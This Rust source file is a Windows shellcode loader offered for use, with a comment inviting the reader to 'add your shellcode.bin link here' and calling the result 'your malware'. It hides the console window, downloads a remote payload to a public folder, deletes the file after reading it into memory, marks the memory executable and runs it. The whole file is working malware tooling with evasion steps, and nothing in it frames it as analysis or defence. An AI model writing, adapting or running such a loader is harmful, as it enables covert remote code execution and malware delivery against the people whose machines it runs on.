use std::{fs, ptr};
use reqwest;
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
};
use windows_sys::Win32::System::Console::GetConsoleWindow;
use windows_sys::Win32::UI::WindowsAndMessaging::{ShowWindow, SW_HIDE};

const PAYLOAD_URL: &str = "https://example.com/shellcode.bin"; // add your shellcode.bin link here
const PAYLOAD_PATH: &str = r"C:\Users\Public\shellcode.bin"; // you can specify the path where you want your malware to be

fn hide_console() {
    unsafe {
        let hwnd = GetConsoleWindow();
        if hwnd != std::ptr::null_mut() {
            ShowWindow(hwnd, SW_HIDE);
        }
    }
}

fn download_payload(url: &str, dest: &str) -> Result<(), Box<dyn std::error::Error>> {
    let response = reqwest::blocking::get(url)?;
    if !response.status().is_success() {
        return Err(format!("Server returned HTTP {}", response.status()).into());
    }
    let bytes = response.bytes()?;
    fs::write(dest, &bytes)?;
    Ok(())
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Step 1: Hide console window
    hide_console();

    // Step 2: Fetch shellcode.bin from remote and drop to disk
    download_payload(PAYLOAD_URL, PAYLOAD_PATH)?;

    // Step 3: Read it back — Vec<u8>.len() is your exact byte count
    let shellcode = fs::read(PAYLOAD_PATH)?;
    let shellcode_size = shellcode.len();

    // Wipe from disk immediately after reading into memory
    let _ = fs::remove_file(PAYLOAD_PATH);

    unsafe {
        // Step 4: Allocate RW region sized exactly to the payload
        let mem = VirtualAlloc(
            ptr::null_mut(),
            shellcode_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        assert!(!mem.is_null(), "VirtualAlloc failed — null pointer returned");

        // Step 5: Copy payload bytes into the allocation
        ptr::copy_nonoverlapping(shellcode.as_ptr(), mem as *mut u8, shellcode_size);

        // Step 6: Flip permissions RW -> RX (W^X)
        let mut old_protect = 0u32;
        VirtualProtect(mem, shellcode_size, PAGE_EXECUTE_READ, &mut old_protect);

        // Step 7: Transmute and call
        let func: extern "system" fn() -> u32 = std::mem::transmute(mem);
        func();
    }

    Ok(())
}
